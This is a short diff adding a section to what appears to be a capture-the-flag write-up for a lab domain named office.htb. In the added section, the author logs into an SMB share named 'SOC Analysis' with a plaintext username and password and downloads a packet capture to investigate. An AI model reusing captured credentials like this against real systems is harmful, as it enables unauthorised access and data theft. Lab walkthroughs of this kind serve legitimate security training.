@@ -400,3 +400,17 @@ Also worth noting there are no kerberoastable users!
 
 # SOC Analysis share
 
+```python
+smbclient //dc.office.htb/'SOC Analysis' -U 'dwolfe'%'H0lOgrams4reTakIng0Ver754!'
+Try "help" to get a list of possible commands.
+smb: \> ls
+  .                                   D        0  Wed May 10 19:52:24 2023
+  ..                                DHS        0  Wed Feb 14 10:18:31 2024
+  Latest-System-Dump-8fbc124d.pcap      A  1372860  Mon May  8 01:59:00 2023
+
+		6265599 blocks of size 4096. 1262783 blocks available
+smb: \> get Latest-System-Dump-8fbc124d.pcap 
+getting file \Latest-System-Dump-8fbc124d.pcap of size 1372860 as Latest-System-Dump-8fbc124d.pcap (7246.9 KiloBytes/sec) (average 7246.9 KiloBytes/sec)
+smb: \>
+```
+Found a pcap file i will investigate
